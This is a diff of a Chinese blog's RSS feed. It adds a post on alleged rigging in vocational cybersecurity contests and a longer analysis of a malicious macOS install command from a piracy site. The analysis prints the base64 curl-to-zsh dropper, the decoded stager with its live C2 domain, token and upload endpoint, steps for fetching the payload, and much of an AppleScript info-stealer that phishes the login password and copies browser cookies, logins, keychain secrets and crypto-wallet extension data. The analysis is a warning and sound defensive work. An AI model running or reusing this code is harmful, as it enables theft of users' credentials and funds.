@@ -44,6 +44,38 @@
 &lt;p&gt;上面的内容可能有些戾气过重，也不必完全纠缠于此，不过是说出了些许真相。我们还需要逆向操作“返魅”回归自己的生活。若你是既得利益者那就笑着吧，开开心心就好。若你不是，那就回头想想，对于普通人来讲，这其实也算是一根救命稻草，尚且不说其中的水深和黑暗。按照认知心理学的动力结构来看，动力源于信念，如果一个有信念之人借此向上也是完全可能可以的。倘若在年少时期有一种前进的信念能让你静下心来也未尝不是一件好事。别相信任何人说的话，包括说多看到的这一段文字，要警觉的面对这个世界。
 最后祝你成为“超人“
 以上是在特定时间、特定情景、特定地点的片面思考，仅以此记录我的思考片段。&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h2 id="前言">前言</h2>
+<p>笔者也是到了回忆学生时代的年纪了，在学生时代的时候深受政治正确的影响，不敢随意发声，加上自己的认知及其狭窄接触不到外面的世界，学校的话就像是公元一世纪西方的基督教一般的存在，职业技能大赛在我的头顶闪闪发光，好像是我触及不到的神像一般屹立在我的脑海。笔者不过是社会底层，迫于无奈，来到浙江苟延残喘的求学罢了，初中那会儿深受同学+老师+家长的三重折磨，这样的环境下我实在无法自救，成绩也是从初一的还行最后保送职教中心。
+我的中学同学，各种欺骗、利用、诱惑、暴力行为我全都见证了一遍，从那个时候开始，我就明白人性不可信，生物底层的基因是这么写的，不要妄想通过所谓的善良来对抗人性。从此也陷入了人生的低谷。哪些卑劣肮脏的画面时常在我脑海当中回忆，对我来讲好像是痛苦的回忆更多一些，这对我来讲真是个悲剧，年少时期的事情像是刻刀一样在我身上烙下了不可磨灭的痕迹。</p>
+<h2 id="梦开始的地方">梦开始的地方</h2>
+<p>说实话保送职教对我来讲是一种救赎，如果我还是在高中学习枯燥的理论我想我应该早早的找个电子厂上班了。职业教育学的是计算机，我还记得当时我们班级的名称是计算机应用，很多同学都说职教是一个黑社会的乌托邦，里面存在着许多小混混，到了里面堪称是混了一场社会。抱着怀疑的态度我到了学校里面，实际上并不是这样的。相反，同学们大多数还是比较好学的，想通过单招单考的形式继续上大学。我那个时候对计算机产生了浓厚的兴趣，在初三那年的暑假我去味千拉面打暑假工，由此购下了我人生的第一台电脑。是一台机械革命 air，cpu是i7-9750H,显卡是3050，这个性能完全是游戏本的规格，但是属于高不成低不就，大型游戏别想畅玩，小游戏倒是绰绰有余。进入学校之后第一件事情就是打听竞赛的事情，我一直对于竞赛耿耿于怀，因为竞赛拿了奖就能保送大专。至少还能继续上个学读个书，确保自己还有时间继续学习和深耕。</p>
+<p>中学第一年的时候参加了打字比赛，手速320/m（字母）左右，在这之后我就开始想参加网络或者是编程相关的比赛了。但是老师还是希望我能回去考试，并且告知我网络搭建的比赛没有前途。比赛没有什么消息，不想让我浪费时间。但是我不想听老师的，我凭着一腔热血，寒暑假我都呆在机房学习相关的知识，对于这件事情我是下了决心了的，不过现实生活的事情总是不会尽人意的。最后我还是没能继续参加。</p>
+<p>第二年体验了一下智能家居的比赛，主要是编程部分，对于变量名称都看不懂的我，更别提编写了……至此我又被劝退了。我似乎有一点害怕。接下来我需要继续面对那一套让我心生畏惧的应试教育了。</p>
+<p>在口罩时期刚开始的时候，我们学校传来了网络安全赛项复苏的消息，这令我十分激动，看到网络安全就会开始幻想黑客，幻想自己快速的敲击命令行执行代码然后攻破电脑的场景。通过几场筛选和考试，成功加入竞赛队。</p>
+<h2 id="暗箱操作">暗箱操作</h2>
+<p>比赛正常来讲分为市赛、省赛、国赛，现在又出了一个世校赛，就跟选拔一样，一层层的耦合，但是实际情况如此吗？并非如此，实际情况当然是有资本介入的，而介入的最佳方式就是学校给厂商钱，厂商给学校排名。而最佳的资金转移方式大致以下三种：</p>
+<ol>
+<li>培训服务（人天）</li>
+<li>专业设备（软硬件）</li>
+<li>造实验室（改造机房）
+这样子是不是感觉陷入了唯钱论？一开始我确实也有这种感觉，后来你会发现，选手们其实大部分还是沉浸其中，按照规则行事的，大家心知肚明的py交易规则。如果我们把画面抽象一个视角。你会发现管理层互相在用利益交换、吃吃喝喝回头来告诉选手你们要努力，不然我们的付出白费了这等话，选手们付出自己的辛勤劳动在努力学习，上层的成绩早已经固定好了，比赛结束还以为自己技不如人。然后陷入深深的内耗当中。至此，我明白了祛魅的重要性。</li>
+</ol>
+<h2 id="控分">控分</h2>
+<p>让我感受最深切的就是，国赛的时候，厂商为了保住第一名，直接手动给选手加分，选手的排名直线上升，自己啥也没干只需要等着加分就行了。这期间还需要注意控分，注意分数不能高的离谱，导致引起不满。
+控分的方法大致分为两种：</p>
+<ol>
+<li>直接修改选手的分数（风险较高，可控度高）</li>
+<li>把答案提前给选手，让选手自行解题（风险较低，可控度低）
+<img alt="image.png" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202511171000345.png">
+大部分情况下还是第二种情况。毕竟是跟教育挂钩，主打一个尽量合规。
+要知道这是在中国，体量之大，厂家你骗骗我，我骗骗你，学校的大部分选手被当成是一种机器，在厂商眼里，没有人。因为他们自己也算不上。实力在交易面前不值一提。能力过于逆天的时候自然会有人过来收录你。不是看上了你的能力，而是为了防止你发声，引起他者的不满。
+笔者也算是屠龙少年终成恶龙的践行者，想来这也没什么，这种荒诞才是日常，才是生活本身。</li>
+</ol>
+<h2 id="落幕">落幕</h2>
+<p>上面的内容可能有些戾气过重，也不必完全纠缠于此，不过是说出了些许真相。我们还需要逆向操作“返魅”回归自己的生活。若你是既得利益者那就笑着吧，开开心心就好。若你不是，那就回头想想，对于普通人来讲，这其实也算是一根救命稻草，尚且不说其中的水深和黑暗。按照认知心理学的动力结构来看，动力源于信念，如果一个有信念之人借此向上也是完全可能可以的。倘若在年少时期有一种前进的信念能让你静下心来也未尝不是一件好事。别相信任何人说的话，包括说多看到的这一段文字，要警觉的面对这个世界。
+最后祝你成为“超人“
+以上是在特定时间、特定情景、特定地点的片面思考，仅以此记录我的思考片段。</p>
+]]></content:encoded>
     </item>
     <item>
       <title>逻辑学</title>
@@ -51,6 +83,8 @@
       <pubDate>Wed, 12 Nov 2025 00:22:31 +0800</pubDate>
       <guid>https://cx330zer0.github.io/posts/7/</guid>
       <description>&lt;p&gt;&lt;img alt=&#34;逻辑学.png&#34; loading=&#34;lazy&#34; src=&#34;https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202511120952213.png&#34;&gt;&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<p><img alt="逻辑学.png" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202511120952213.png"></p>
+]]></content:encoded>
     </item>
     <item>
       <title>盗版软件网站如何引导你执行后门程序？</title>
@@ -1189,6 +1223,1139 @@ curl -k -s --max-time 30 -H &amp;#34;User-Agent: Mozilla/5.0 (Macintosh; Intel M
 **end if**
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;后记&#34;&gt;后记&lt;/h2&gt;
 &lt;p&gt;借助GPT的分析你会发现这是一段后门程序，执行完成之后会主动退出terminal然后将所有的输入输出以及错误重定向到/dev/null（黑洞）的位置，至此你是无感执行的，最后这段程序大概含义就是盗取你的比特币钱包替换为对方的，然后提取你电脑的重要信息打包到一个临时目录中最后再上传到对方的服务器当中，整个过程相当丝滑，现在想想之前的盗版软件下载了一大堆，那个时候电脑莫名发热很可能就是用来当肉鸡挖矿或者任由对方摆布了&amp;hellip;，能支持正版还是尽量支持正版吧，看到linuxdo上面的安全大佬也给过提醒：绝大部分的盗版软件都是有后门的，能正版就尽量支持正版吧。&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h1 id="前言">前言</h1>
+<p>最近重装了一下macos，恢复之后的macos流畅度感觉提升了不止一个度，之前可能是装了太多的盗版软件以及渗透测试工具，杂乱无章……导致我的macos及其臃肿，最近实在受不这样的mac，直接重制了操作系统，会想起以前自己搜集的一些好用的工具都在github中，最近在 <a href="https://github.com/jaywcjlove/awesome-mac">awesome-mac</a>这个项目当看到三个盗版网站，想到GPT也是可以推荐盗版网站的，问问GPT盗版网站的列表，于是给了我一些惊喜，确实有很多的网站被推荐了出来，当我看到这个<a href="https://www.torrentmac.net">mactorrent</a>站点的时候特别好奇，根据我的体验带有torrent的网站体验都还行，本着影响还不错的原因，想去这里下载一个cleanmymac x用来卸载mac的软件</p>
+<h2 id="事件经过">事件经过</h2>
+<p>网页大概是这个样子的
+<img alt="image.png" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202511111844803.png">
+随便找一个软件找到下载的位置
+<img alt="image.png" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202511111845895.png"></p>
+<p>可以看到给了一段curl 下载程序的指令，对于用惯了terminal的朋友们来说真的特别习惯，下面甚至还有图文教程，教你如何打开terminal然后复制粘贴这段指令最后执行
+<img alt="image.png" loading="lazy" src="https://mirrozer0.oss-cn-hangzhou.aliyuncs.com/image/202511111846072.png"></p>
+<p>由于前些年打CTF的阴影，导致我对base64比较敏感，看到这段编码不由得去解开了解其中的奥秘</p>
+<pre tabindex="0"><code>curl -kfsSL $(echo &#39;aHR0cHM6Ly9uaGF4dW9uZy5jb20vY3VybC8yNTkxOWU4YzRkNjcwMDcwNGZjNDVhOTFiNmY2NDM2ZGI0MTM5YmZhNzUwZDUxYmYzNmVhMWM2ZjZmMGY2YzAw&#39;|base64 -d)|zsh
+</code></pre><p>这段base64解码之后得到如下url</p>
+<pre tabindex="0"><code>https://nhaxuong.com/curl/25919e8c4d6700704fc45a91b6f6436db4139bfa750d51bf36ea1c6f6f0f6c00
+#链接下载之后得到如下内容
+
+#!/bin/zsh
+d11268=$(base64 -d &lt;&lt;&#39;PAYLOAD_m216212141828691&#39; | gunzip
+H4sIAEuIEmkAA+VUW2/TMBR+7684ZNXUSiSxm9vSUbYJCYZGNaQWMQlQ5TjHrVXHjhIXugH/nayt
+uqzbC29I+Mn6LpbPd4599MLPpPYzVi86OcPC6JlYaW6l0b0+/OxAs3CNHF75OX739UqpB+z1M9jg
+AFxKpZhSMMWqkJptQWU4U5Cbgkk9cvSCrVdGzz1uCqfFW7PEhh5EKU3xhId5nBCSkFDwMGIpzWIR
+h0GcZyEN0kywJCJ5RDMRxMgob0hBRMwJaR/JSjlb4u3IiWhKUNAkCOhJwEjO40Bk8SAIokREcR5v
+TVLAF+gegTu3QODbKdgF6g1zv/iqUuAuwa3BdQu2dq0sEAIC7iU4n2qs3Is5ajuEsbm7T8GPPAK9
+MeNSW1MvTuG9tqigAeB6AjdAyYxGs6QPF2Wp8DNmV9L6UZB4QQy9q8vp+MNLUHKJ8A750vThzaIy
+Bfop9YgXhsnAozSECROskjubs7lKU7TbFD2E7q58B5yFtWU99P3utgl+fqtZIfmZXeej7ib44/JH
+s6UO/AJTs5pXsrTbNqsa/5MMnhYvZGswzsDV+Mxg4FpaoG39PqYb+Hg9mcLXvfZfCurgVs9kdqDg
+agjkMdoeAvKIeQuOkApH574tSr+JVZn5XDbP/k6WzqEyW0mVtxvR4p80bs4sbh/sXzfnd6dRH3x8
+4HTPHTh+sG0spLMf/N0Rjf0PgDlK/z8FAAA=
+PAYLOAD_m216212141828691
+)
+eval &#34;$d11268&#34;
+
+#至此已经初现端倪，可以看到payload、eval这些关键词,我们接着解码，得到如下脚本
+#!/bin/bash
+daemon_function() {
+    exec &lt;/dev/null
+    exec &gt;/dev/null
+    exec 2&gt;/dev/null
+    killall Terminal
+    local domain=&#34;nhaxuong.com&#34;
+    local token=&#34;25919e8c4d6700704fc45a91b6f6436db4139bfa750d51bf36ea1c6f6f0f6c00&#34;
+    local api_key=&#34;5190ef1733183a0dc63fb623357f56d6&#34;
+    if [ $# -gt 0 ]; then
+        curl -k -s --max-time 30 -H &#34;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36&#34; -H &#34;api-key: $api_key&#34; &#34;https://$domain/dynamic?txd=$token&amp;pwd=$1&#34; | osascript
+    else
+        curl -k -s --max-time 30 -H &#34;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36&#34; -H &#34;api-key: $api_key&#34; &#34;https://$domain/dynamic?txd=$token&#34; | osascript
+    fi
+    if [ $? -ne 0 ]; then
+        exit 1
+    fi
+    curl -k -X POST \
+         -H &#34;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36&#34; \
+         -H &#34;api-key: $api_key&#34; \
+         -H &#34;cl: 0&#34; \
+         --max-time 300 \
+         -F &#34;file=@/tmp/osalogging.zip&#34; \
+         -F &#34;buildtxd=$token&#34; \
+         &#34;https://$domain/gate&#34;
+    
+    if [ $? -ne 0 ]; then
+        exit 1
+    fi
+}
+if daemon_function &#34;$@&#34; &amp; then
+    exit 0
+else
+    exit 1
+fi
+#最后我们截取
+curl -k -s --max-time 30 -H &#34;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36&#34; -H &#34;api-key: $api_key&#34; &#34;https://$domain/dynamic?txd=$token&amp;pwd=$1&#34; 
+#这段指令，使用terminal执行，得到之后木马
+执行curl这段指令的时候需要先在terminal执行下面三个赋值的指令，不然你是没权限获得脚本的
+    local domain=&#34;nhaxuong.com&#34;
+    local token=&#34;25919e8c4d6700704fc45a91b6f6436db4139bfa750d51bf36ea1c6f6f0f6c00&#34;
+    local api_key=&#34;5190ef1733183a0dc63fb623357f56d6&#34;
+
+#木马脚本如下
+
+**on filesizer(paths)**
+
+**set fsz to 0**
+
+**try**
+
+**set theItem to quoted form of POSIX path of paths**
+
+**set fsz to (do shell script &#34;/usr/bin/mdls -name kMDItemFSSize -raw &#34; &amp; theItem)**
+
+**end try**
+
+**return fsz**
+
+**end filesizer**
+
+  
+
+**on mkdir(someItem)**
+
+**try**
+
+**set filePosixPath to quoted form of (POSIX path of someItem)**
+
+**do shell script &#34;mkdir -p &#34; &amp; filePosixPath**
+
+**end try**
+
+**end mkdir**
+
+  
+
+**on FileName(filePath)**
+
+**try**
+
+**set reversedPath to (reverse of every character of filePath) as string**
+
+**set trimmedPath to text 1 thru ((offset of &#34;/&#34; in reversedPath) - 1) of reversedPath**
+
+**set finalPath to (reverse of every character of trimmedPath) as string**
+
+**return finalPath**
+
+**end try**
+
+**end FileName**
+
+  
+
+**on BeforeFileName(filePath)**
+
+**try**
+
+**set lastSlash to offset of &#34;/&#34; in (reverse of every character of filePath) as string**
+
+**set trimmedPath to text 1 thru -(lastSlash + 1) of filePath**
+
+**return trimmedPath**
+
+**end try**
+
+**end BeforeFileName**
+
+  
+
+**on writeText(textToWrite, filePath)**
+
+**try**
+
+**set folderPath to BeforeFileName(filePath)**
+
+**mkdir(folderPath)**
+
+**set fileRef to (open for access filePath with write permission)**
+
+**write textToWrite to fileRef starting at eof**
+
+**close access fileRef**
+
+**end try**
+
+**end writeText**
+
+  
+
+**on readwrite(path_to_file, path_as_save)**
+
+**try**
+
+**set fileContent to read path_to_file**
+
+**set folderPath to BeforeFileName(path_as_save)**
+
+**mkdir(folderPath)**
+
+**do shell script &#34;cat &#34; &amp; quoted form of path_to_file &amp; &#34; &gt; &#34; &amp; quoted form of path_as_save**
+
+**end try**
+
+**end readwrite**
+
+  
+
+**on isDirectory(someItem)**
+
+**try**
+
+**set filePosixPath to quoted form of (POSIX path of someItem)**
+
+**set fileType to (do shell script &#34;file -b &#34; &amp; filePosixPath)**
+
+**if fileType ends with &#34;directory&#34; then**
+
+**return true**
+
+**end if**
+
+**return false**
+
+**end try**
+
+**end isDirectory**
+
+  
+
+**on GrabFolderLimit(sourceFolder, destinationFolder)**
+
+**try**
+
+**set bankSize to 0**
+
+**set exceptionsList to {&#34;.DS_Store&#34;, &#34;Partitions&#34;, &#34;Code Cache&#34;, &#34;Cache&#34;, &#34;market-history-cache.json&#34;, &#34;journals&#34;, &#34;Previews&#34;}**
+
+**set fileList to list folder sourceFolder without invisibles**
+
+**mkdir(destinationFolder)**
+
+**repeat with currentItem in fileList**
+
+**if currentItem is not in exceptionsList then**
+
+**set itemPath to sourceFolder &amp; &#34;/&#34; &amp; currentItem**
+
+**set savePath to destinationFolder &amp; &#34;/&#34; &amp; currentItem**
+
+**if isDirectory(itemPath) then**
+
+**GrabFolderLimit(itemPath, savePath)**
+
+**else**
+
+**set fsz to filesizer(itemPath)**
+
+**set bankSize to bankSize + fsz**
+
+**if bankSize &lt; 100 * 1024 * 1024 then**
+
+**readwrite(itemPath, savePath)**
+
+**end if**
+
+**end if**
+
+**end if**
+
+**end repeat**
+
+**end try**
+
+**end GrabFolderLimit**
+
+  
+
+**on GrabFolder(sourceFolder, destinationFolder)**
+
+**try**
+
+**set exceptionsList to {&#34;.DS_Store&#34;, &#34;Partitions&#34;, &#34;Code Cache&#34;, &#34;Cache&#34;, &#34;market-history-cache.json&#34;, &#34;journals&#34;, &#34;Previews&#34;, &#34;dumps&#34;, &#34;emoji&#34;, &#34;user_data&#34;, &#34;__update__&#34;}**
+
+**set fileList to list folder sourceFolder without invisibles**
+
+**mkdir(destinationFolder)**
+
+**repeat with currentItem in fileList**
+
+**if currentItem is not in exceptionsList then**
+
+**set itemPath to sourceFolder &amp; &#34;/&#34; &amp; currentItem**
+
+**set savePath to destinationFolder &amp; &#34;/&#34; &amp; currentItem**
+
+**if isDirectory(itemPath) then**
+
+**GrabFolder(itemPath, savePath)**
+
+**else**
+
+**readwrite(itemPath, savePath)**
+
+**end if**
+
+**end if**
+
+**end repeat**
+
+**end try**
+
+**end GrabFolder**
+
+  
+
+**on checkvalid(username, password_entered)**
+
+**try**
+
+**set result to do shell script &#34;dscl . authonly &#34; &amp; quoted form of username &amp; space &amp; quoted form of password_entered**
+
+**if result is not equal to &#34;&#34; then**
+
+**return false**
+
+**else**
+
+**return true**
+
+**end if**
+
+**on error**
+
+**return false**
+
+**end try**
+
+**end checkvalid**
+
+  
+
+**on getpwd(username, writemind, provided_password)**
+
+    **try**
+
+        **if provided_password is not equal to &#34;&#34; then**
+
+            **if checkvalid(username, provided_password) then**
+
+                **writeText(provided_password, writemind &amp; &#34;Password&#34;)**
+
+                **return provided_password**
+
+            **end if**
+
+        **end if**
+
+        **if checkvalid(username, &#34;&#34;) then**
+
+            **set result to do shell script &#34;security 2&gt;&amp;1 &gt; /dev/null find-generic-password -ga \&#34;Chrome\&#34; | awk \&#34;{print $2}\&#34;&#34;**
+
+            **writeText(result as string, writemind &amp; &#34;masterpass-chrome&#34;)**
+
+            **return &#34;&#34;**
+
+        **else**
+
+            **repeat**
+
+                **set result to display dialog &#34;Required Application Helper. Please enter password for continue.&#34; default answer &#34;&#34; with icon caution buttons {&#34;Continue&#34;} default button &#34;Continue&#34; giving up after 150 with title &#34;System Preferences&#34; with hidden answer**
+
+                **set password_entered to text returned of result**
+
+                **if checkvalid(username, password_entered) then**
+
+                    **writeText(password_entered, writemind &amp; &#34;Password&#34;)**
+
+                    **return password_entered**
+
+                **end if**
+
+            **end repeat**
+
+        **end if**
+
+    **end try**
+
+    **return &#34;&#34;**
+
+**end getpwd**
+
+  
+
+**on grabPlugins(paths, savePath, pluginList, index)**
+
+**try**
+
+**set fileList to list folder paths without invisibles**
+
+**repeat with PFile in fileList**
+
+**repeat with Plugin in pluginList**
+
+**if (PFile contains Plugin) then**
+
+**set newpath to paths &amp; PFile**
+
+**set newsavepath to savePath &amp; &#34;/&#34; &amp; Plugin**
+
+**if index then**
+
+**set newsavepath to savePath &amp; &#34;/IndexedDB/&#34; &amp; PFile**
+
+**end if**
+
+**GrabFolder(newpath, newsavepath)**
+
+**end if**
+
+**end repeat**
+
+**end repeat**
+
+**end try**
+
+**end grabPlugins**
+
+  
+
+**on Chromium(writemind, chromium_map)**
+
+**set pluginList to {}**
+
+    **set pluginList to pluginList &amp; {&#34;eiaeiblijfjekdanodkjadfinkhbfgcd&#34;, &#34;aeblfdkhhhdcdjpifhhbdiojplfjncoa&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;bfogiafebfohielmmehodmfbbebbbpei&#34;, &#34;nngceckbapebfimnlniiiahkandclblb&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;fdjamakpfbbddfjaooikfcpapjohcfmg&#34;, &#34;hdokiejnpimakedhajhdlcegeplioahd&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;pnlccmojcmeohlpggmfnbbiapkmbliob&#34;, &#34;ghmbeldphafepmbegfdlkpapadhbakde&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;kmcfomidfpdkfieipokbalgegidffkal&#34;, &#34;bnfdmghkeppfadphbnkjcicejfepnbfe&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;caljgklbbfbcjjanaijlacgncafpegll&#34;, &#34;folnjigffmbjmcjgmbbfcpleeddaedal&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;igkpcodhieompeloncfnbekccinhapdb&#34;, &#34;admmjipmmciaobhojoghlmleefbicajg&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;ehpbfbahieociaeckccnklpdcmfaeegd&#34;, &#34;epanfjkfahimkgomnigadpkobaefekcd&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;didegimhafipceonhjepacocaffmoppf&#34;, &#34;oboonakemofpalcgghocfoadofidjkkk&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;jgnfghanfbjmimbdmnjfofnbcgpkbegj&#34;, &#34;mmhlniccooihdimnnjhamobppdhaolme&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;dbfoemgnkgieejfkaddieamagdfepnff&#34;, &#34;bhghoamapcdpbohphigoooaddinpkbai&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;nngceckbapebfimnlniiiahkandclblb&#34;, &#34;lojeokmpinkpmpbakfkfpgfhpapbgdnd&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;ibpjepoimpcdofeoalokgpjafnjonkpc&#34;, &#34;gmohoglkppnemohbcgjakmgengkeaphi&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;hdokiejnpimakedhajhdlcegeplioahd&#34;, &#34;oboonakemofpalcgghocfoadofidjkkk&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;dckgbiealcgdhgjofgcignfngijpbgba&#34;, &#34;gmegpkknicehidppoebnmbhndjigpica&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;eiokpeobbgpinbmcanngjjbklmhlepan&#34;, &#34;odfkmgboddhcgopllebhkbjhokpojigd&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;ppnbnpeolgkicgegkbkbjmhlideopiji&#34;, &#34;cejfhijdfemlohmcjknpbeaohedoikpp&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;nmhjblhloefhbhgbfkdgdpjabaocnhha&#34;, &#34;iklgijhacenjgjgdnpnohbafpbmnccek&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;ppkkcfblhfgmdmefkmkoomenhgecbemi&#34;, &#34;lgndjfkadlbpaifdpbbobdodbaiaiakb&#34;}**
+
+    **set pluginList to pluginList &amp; {&#34;bbphmbmmpomfelajledgdkgclfekilei&#34;, &#34;bnfooenhhgcnhdkdjelgmmkpaemlnoek&#34;}**
+
+  
+
+**set chromiumFiles to {&#34;/Network/Cookies&#34;, &#34;/Cookies&#34;, &#34;/Web Data&#34;, &#34;/Login Data&#34;, &#34;/Local Extension Settings/&#34;, &#34;/IndexedDB/&#34;}**
+
+**repeat with chromium in chromium_map**
+
+**set savePath to writemind &amp; &#34;Browsers/&#34; &amp; item 1 of chromium &amp; &#34;_&#34;**
+
+**try**
+
+**set fileList to list folder item 2 of chromium without invisibles**
+
+**repeat with currentItem in fileList**
+
+**if ((currentItem as string) is equal to &#34;Default&#34;) or ((currentItem as string) contains &#34;Profile&#34;) then**
+
+**set profileName to (item 1 of chromium &amp; currentItem)**
+
+**repeat with CFile in chromiumFiles**
+
+**set readpath to (item 2 of chromium &amp; currentItem &amp; CFile)**
+
+**if ((CFile as string) is equal to &#34;/Network/Cookies&#34;) then**
+
+**set CFile to &#34;/Cookies&#34;**
+
+**end if**
+
+**if ((CFile as string) is equal to &#34;/Local Extension Settings/&#34;) then**
+
+**grabPlugins(readpath, writemind &amp; &#34;Extensions/&#34; &amp; profileName, pluginList, false)**
+
+**else if (CFile as string) is equal to &#34;/IndexedDB/&#34; then**
+
+**grabPlugins(readpath, writemind &amp; &#34;Extensions/&#34; &amp; profileName, pluginList, true)**
+
+**else**
+
+**set writepath to savePath &amp; currentItem &amp; CFile**
+
+**readwrite(readpath, writepath)**
+
+**end if**
+
+**end repeat**
+
+**end if**
+
+**end repeat**
+
+**end try**
+
+**end repeat**
+
+**end Chromium**
+
+  
+
+**on ChromiumWallets(writemind, chromium_map)**
+
+**set pluginList to {}**
+
+**set pluginList to pluginList &amp; {&#34;nkbihfbeogaeaoehlefnkodbefgpgknn&#34;, &#34;bfnaelmomeimhlpmgjnjophhpkkoljpa&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;hnfanknocfeofbddgcijnmhnfnkdnaad&#34;, &#34;fnjhmkhhmkbjkkabndcnnogagogbneec&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;acmacodkjbdgmoleebolmdjonilkdbch&#34;, &#34;egjidjbpglichdcondbcbdnbeeppgdph&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;aholpfdialjgjfhomihkjbmgjidlcdno&#34;, &#34;fhbohimaelbohpjbbldcngcnapndodjp&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;pdliaogehgdbhbnmkklieghmmjkpigpa&#34;, &#34;mcohilncbfahbmgdjkbpemcciiolgcge&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;hpglfhgfnhbgpjdenjgmdgoeiappafln&#34;, &#34;bhhhlbepdkbapadjdnnojkbgioiodbic&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;dhgnlgphgchebgoemcjekedjjbifijid&#34;, &#34;cjmkndjhnagcfbpiemnkdpomccnjblmj&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;kamfleanhcmjelnhaeljonilnmjpkcjc&#34;, &#34;jnldfbidonfeldmalbflbmlebbipcnle&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;fdcnegogpncmfejlfnffnofpngdiejii&#34;, &#34;klnaejjgbibmhlephnhpmaofohgkpgkd&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;pdadjkfkgcafgbceimcpbkalnfnepbnk&#34;, &#34;kjjebdkfeagdoogagbhepmbimaphnfln&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;ldinpeekobnhjjdofggfgjlcehhmanlj&#34;, &#34;dkdedlpgdmmkkfjabffeganieamfklkm&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;bcopgchhojmggmffilplmbdicgaihlkp&#34;, &#34;kpfchfdkjhcoekhdldggegebfakaaiog&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;idnnbdplmphpflfnlkomgpfbpcgelopg&#34;, &#34;mlhakagmgkmonhdonhkpjeebfphligng&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;bipdhagncpgaccgdbddmbpcabgjikfkn&#34;, &#34;gcbjmdjijjpffkpbgdkaojpmaninaion&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;nhnkbkgjikgcigadomkphalanndcapjk&#34;, &#34;hoighigmnhgkkdaenafgnefkcmipfjon&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;klghhnkeealcohjjanjjdaeeggmfmlpl&#34;, &#34;fhbohimaelbohpjbbldcngcnapndodjp&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;ebfidpplhabeedpnhjnobghokpiioolj&#34;, &#34;emeeapjkbcbpbpgaagfchmcgglmebnen&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;fldfpgipfncgndfolcbkdeeknbbbnhcc&#34;, &#34;penjlddjkjgpnkllboccdgccekpkcbin&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;fhilaheimglignddkjgofkcbgekhenbh&#34;, &#34;hmeobnfnfcmdkdcmlblgagmfpfboieaf&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;cihmoadaighcejopammfbmddcmdekcje&#34;, &#34;lodccjjbdhfakaekdiahmedfbieldgik&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;omaabbefbmiijedngplfjmnooppbclkk&#34;, &#34;cjelfplplebdjjenllpjcblmjkfcffne&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;jnlgamecbpmbajjfhmmmlhejkemejdma&#34;, &#34;fpkhgmpbidmiogeglndfbkegfdlnajnf&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;bifidjkcdpgfnlbcjpdkdcnbiooooblg&#34;, &#34;amkmjjmmflddogmhpjloimipbofnfjih&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;flpiciilemghbmfalicajoolhkkenfel&#34;, &#34;hcflpincpppdclinealmandijcmnkbgn&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;aeachknmefphepccionboohckonoeemg&#34;, &#34;dmkamcknogkgcdfhhbddcghachkejeap&#34;}**
+
+**set pluginList to pluginList &amp; {&#34;aiifbnbfobpmeekipheeijimdpnlpgpp&#34;}**
+
+  
+
+**set chromiumFiles to {&#34;/Local Extension Settings/&#34;, &#34;/IndexedDB/&#34;}**
+
+**repeat with chromium in chromium_map**
+
+**try**
+
+**set fileList to list folder item 2 of chromium without invisibles**
+
+**repeat with currentItem in fileList**
+
